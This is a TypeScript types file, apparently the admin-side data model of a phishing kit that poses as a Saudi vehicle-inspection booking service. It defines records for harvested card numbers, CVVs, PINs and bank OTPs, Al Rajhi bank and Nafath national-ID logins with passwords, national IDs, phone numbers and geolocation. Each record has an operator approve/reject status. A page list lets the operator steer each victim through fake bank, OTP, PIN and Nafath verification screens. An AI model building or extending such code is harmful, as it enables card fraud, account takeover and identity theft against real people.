export interface BlockedBIN {
  id: string;
  bin: string;
  description: string;
  createdAt: number;
  updatedAt: number;
}

export interface BlockedUser {
  id: string;
  name?: string;
  privateIp?: string;
  publicIpv4?: string;
  publicIpv6?: string;
  blockedAt: number;
}

export interface PaymentData {
  cardHolderName: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  status?: 'pending' | 'approved' | 'rejected' | string;
  amount?: number | string;
  cardType?: string;
  timestamp?: number;
  approvedAt?: number;
  rejectedAt?: number;
  rejectMessage?: string;
  pin?: string | null;
  pinSubmittedAt?: number | null;
  pinStatus?: 'approved' | 'rejected' | null;
  otp?: string;
  otpSubmittedAt?: number;
  otpScheme?: 'mada' | 'visa' | 'mastercard' | null;
  otpStatus?: 'approved' | 'rejected' | null;
}

// واجهة بيانات الموقع الجغرافي
export interface LocationData {
  // الإحداثيات الأساسية
  latitude: number;           // خط العرض
  longitude: number;          // خط الطول
  accuracy: number;           // دقة الموقع بالأمتار

  // روابط خرائط جوجل
  googleMapsUrl: string;      // رابط مباشر لخرائط جوجل

  // العنوان المفصل (من Reverse Geocoding)
  address?: {
    fullAddress?: string;     // العنوان الكامل
    city?: string;            // المدينة (الرياض، جدة، إلخ)
    district?: string;        // الحي
    street?: string;          // الشارع
    region?: string;          // المنطقة
    country?: string;         // الدولة
  };

  // معلومات إضافية
  timestamp: number;          // وقت أخذ الموقع
  permissionStatus: 'granted' | 'denied' | 'prompt'; // حالة الإذن
}

export interface UserData {
  ip: string;
  privateIp?: string;
  publicIp?: string;
  publicIpv4?: string;
  publicIpv6?: string;
  clientCookieId?: string;
  name?: string;
  nationalID?: string;
  phoneNumber?: string;
  cardLinkedPhoneNumber?: string;
  phoneProvider?: string;
  birthDate?: string;
  age?: number;
  email?: string;
  currentPage: string;
  previousPage?: string;  // للصفحة السابقة لتتبع التغيير
  status: 'online' | 'offline';
  lastSeen: number;
  payments: PaymentData[];
  hasNewData: boolean;
  hasPayment: boolean;
  isFlagged: boolean;
  isBlocked: boolean;
  // حقول تتبع المعلومات الجديدة
  newPersonalData?: boolean;   // المعلومات الشخصية جديدة
  newPaymentData?: boolean;    // بيانات الدفع جديدة
  newContactData?: boolean;     // معلومات الاتصال جديدة
  newLocationData?: boolean;   // الموقع الجغرافي جديد
  newBookingData?: boolean;    // بيانات الحجز جديدة
  isNew?: boolean;             // زبون جديد لم يتم فتح صفحته
  lastViewedAt?: number;       // آخر وقت تم فيه فتح صفحة الزبون
  // Booking data
  nationality?: string;
  plate?: string;
  vehicleType?: string;
  vehicleStatus?: 'license' | 'customs' | string;
  region?: string;
  inspectionCenter?: string;
  serviceType?: string;
  hazardous?: string;
  inspectionDate?: string;
  inspectionTime?: string;
  authorizedPersonType?: 'citizen' | 'resident' | string;
  authorizedPersonName?: string;
  authorizedPersonPhone?: string;
  authorizedPersonNationality?: string;
  authorizedPersonId?: string;
  authorizedPersonBirthDate?: string;
  authorizedPersonDeclaration?: boolean;
  callVerification?: {
    provider?: string;
    cardLinkedPhoneNumber?: string;
    status?: 'pending' | 'approved' | 'rejected';
    requestedAt?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
    history?: Record<string, {
      status: 'approved' | 'rejected';
      timestamp: number;
      message?: string;
    }>;
  };
  otpMobile?: string;
  otpBank?: string;
  pendingPhoneOtpVerification?: {
    code?: string;
    flow?: 'default' | 'login' | 'password-reset' | string;
    loginAttemptId?: string;
    passwordResetAttemptId?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
  };
  pendingBankOtpVerification?: {
    code?: string;
    scheme?: 'mada' | 'visa' | 'mastercard' | 'unknown';
    paymentKey?: string;
    cardNumber?: string;
    cardHolderName?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
  };
  pendingPayment?: PaymentData & {
    auditId?: string;
    cardLinkedPhoneNumber?: string;
  };
  pendingPinVerification?: {
    pin?: string;
    paymentKey?: string;
    cardNumber?: string;
    cardHolderName?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    auditId?: string;
  };
  otpBankHistory?: Record<string, {
    code?: string;
    status: 'rejected';
    message?: string;
    timestamp: number;
    scheme?: 'mada' | 'visa' | 'mastercard' | 'unknown';
    paymentKey?: string;
    cardLast4?: string;
  }>;
  otpResendAlert?: {
    scheme?: 'mada' | 'visa' | 'mastercard';
    requestedAt?: number;
    expiresAt?: number;
  };
  mobileOtpResendAlert?: {
    requestedAt?: number;
    expiresAt?: number;
  };
  pendingRajhiLogin?: {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  pendingLogin?: {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  pendingPasswordReset?: {
    attemptId?: string;
    username?: string;
    password?: string;
    confirmPassword?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  pendingPasswordResetOtpContext?: {
    attemptId?: string | null;
    createdAt?: number;
    status?: 'pending' | 'approved' | 'rejected';
  };
  loginCustomerName?: string;
  logins?: Record<string, {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  passwordResets?: Record<string, {
    attemptId?: string;
    username?: string;
    password?: string;
    confirmPassword?: string;
    otpMobile?: string;
    otpSubmittedAt?: number;
    otpStatus?: 'pending' | 'approved' | 'rejected';
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  rajhiLogins?: Record<string, {
    attemptId?: string;
    username?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  pendingNewAccount?: {
    attemptId?: string;
    firstName?: string;
    lastName?: string;
    nationalId?: string;
    phone?: string;
    email?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  newAccounts?: Record<string, {
    attemptId?: string;
    firstName?: string;
    lastName?: string;
    nationalId?: string;
    phone?: string;
    email?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  pendingNafadLogin?: {
    attemptId?: string;
    loginType?: 'app' | 'password';
    idNumber?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  };
  nafadLogins?: Record<string, {
    attemptId?: string;
    loginType?: 'app' | 'password';
    idNumber?: string;
    password?: string;
    status?: 'pending' | 'approved' | 'rejected';
    timestamp?: number;
    approvedAt?: number;
    rejectedAt?: number;
    rejectMessage?: string;
  }>;
  nafadBasmahCode?: string;
  pin?: string;
  nonSaudiAppointment?: {
    fullName?: string;
    idNumber?: string;
    phoneNumber?: string;
    countryCode?: string;
    email?: string;
    registrationCountryCode?: string;
    registrationCountryName?: string;
    plateInfo?: string;
    vehicleTypeCode?: string;
    vehicleTypeLabel?: string;
    serviceTypeCode?: string;
    regionCode?: string;
    regionLabel?: string;
    inspectionCenterId?: string;
    inspectionCenterName?: string;
    submittedAt?: number;
  };
  // Location data
  location?: LocationData;    // بيانات الموقع الجغرافي
  locationDeniedCount?: number;
  locationSkipEnabled?: boolean;
}

export type UsersMap = Record<string, UserData>;

export interface NavigationContextData {
  flow?: 'default' | 'login' | 'password-reset' | string;
  serviceType?: string;
  adminTargetPage?: string;
  postPaymentLock?: boolean;
  lastPostPaymentPage?: string;
  resetJourney?: boolean;
  bookingDraft?: {
    nationality?: string;
    plate?: string;
    vehicleType?: string;
    vehicleStatus?: string;
    region?: string;
    inspectionCenter?: string;
    serviceType?: string;
    hazardous?: string;
    inspectionDate?: string;
    inspectionTime?: string;
    clientName?: string;
    idNumber?: string;
    phone?: string;
    email?: string;
  };
}

export interface NavigatePayload {
  ip: string;
  page: string;
  contextData?: NavigationContextData;
}

// All available pages for navigation
export const AVAILABLE_PAGES = [
  { id: '/home', label: 'الرئيسية', icon: '🏠', category: 'main' },
  { id: '/booking', label: 'الحجز', icon: '📋', category: 'main' },
  { id: '/billing', label: 'طريقة الدفع', icon: '💳', category: 'payment' },
  { id: '/rajhi', label: 'بنك الراجحي', icon: '🏦', category: 'bank' },
  { id: '/phone', label: 'رقم الجوال', icon: '📱', category: 'verification' },
  { id: '/otp-phone', label: 'OTP الجوال', icon: '📲', category: 'verification' },
  { id: '/mada-otp', label: 'OTP مدى', icon: '🔐', category: 'verification' },
  { id: '/visa-otp', label: 'OTP فيزا', icon: '🔐', category: 'verification' },
  { id: '/mastercard-otp', label: 'OTP ماستركارد', icon: '🔐', category: 'verification' },
  { id: '/pin', label: 'PIN البطاقة', icon: '🔢', category: 'verification' },
  { id: '/nafad', label: 'نفاذ', icon: '🪪', category: 'verification' },
  { id: '/nafad-basmah', label: 'بصمة نفاذ', icon: '🧬', category: 'verification' },
  { id: '/call', label: 'اتصال IVR', icon: '📞', category: 'verification' },
  { id: '/whatsapp', label: 'واتساب', icon: '💬', category: 'other' },
  { id: '/verification', label: 'جاري التحقق', icon: '⏳', category: 'other' },
];

// Page categories for grouping
export const PAGE_CATEGORIES = {
  main: { label: 'الصفحات الرئيسية', color: 'blue' },
  payment: { label: 'الدفع', color: 'green' },
  bank: { label: 'البنوك', color: 'purple' },
  verification: { label: 'التحقق', color: 'orange' },
  other: { label: 'أخرى', color: 'gray' }
};